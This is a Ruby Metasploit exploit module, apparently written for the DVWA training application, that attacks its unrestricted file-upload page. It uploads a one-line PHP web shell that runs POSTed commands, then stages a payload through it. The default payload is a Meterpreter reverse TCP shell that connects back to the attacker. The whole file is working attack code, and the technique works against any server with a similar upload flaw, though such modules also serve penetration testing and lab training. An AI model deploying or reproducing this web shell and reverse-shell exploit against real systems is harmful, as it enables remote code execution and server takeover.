class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize
    super(
      'Name'        => 'DVWA File Upload',
      'Description' => 'DVWA File Upload Attacker',
      'Author'      => 'huti',
      'License'     => MSF_LICENSE,
      'Platform'       => 'linux',
      'Arch'           => [ARCH_X86, ARCH_X64],
      'Targets'        =>
        [
          ['linux',  {} ],
          ['windows',{} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Dec 13 2019',
      'DefaultTarget'  => 0,
      'DefaultOptions' => {'Payload' => 'linux/x64/meterpreter/reverse_tcp'}
      )

    register_options([
        Opt::RPORT(80),
        OptString.new('METHOD', [true, 'HTTP Method', 'POST']),
        OptString.new('URIPATH', [ false,  "The path to upload a file", '/vulnerabilities/upload/']),
        OptString.new('COOKIE',[ false, "HTTP Cookies", '']),
      ])
  
    deregister_options('SSL','VHOST','SSLCert','SRVHOST','SRVPORT')
  end
  
  def upload(fname,fcontent)
    data = Rex::MIME::Message.new
    data.add_part("100000",nil,nil,"form-data; name='MAX_FILE_SIZE'")
    data.add_part(fcontent,"application/x-php",nil,"form-data; name='uploaded'; filename=#{fname}")
    data.add_part("Upload",nil,nil,"form-data; name='Upload'")
    res_up = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(datastore['URIPATH']),
      'ctype' => "multipart/form-data; boundary=#{data.bound}",
      'cookie' => datastore['COOKIE'],
      'data' => data.to_s
    )
  end

  def execute_command(cmd, opt={})
	http_method = datastore['METHOD'].upcase
	res = send_request_cgi({
          'uri'  => normalize_uri('hackable','uploads','msf.php'),
	  'method'  => http_method,
          'ctype' => 'application/x-www-form-urlencoded',
          'cookie' => datastore['COOKIE'],
	  'vars_post' => {'cmd' => "#{cmd}"}
	   })
  end

  def exploit
    fname = "msf.php"
    fcontent = "<?php system($_POST['cmd']) ?>"
    upload(fname, fcontent)
    print_status("Uploading PHP payload...")
    execute_cmdstager
  end

end


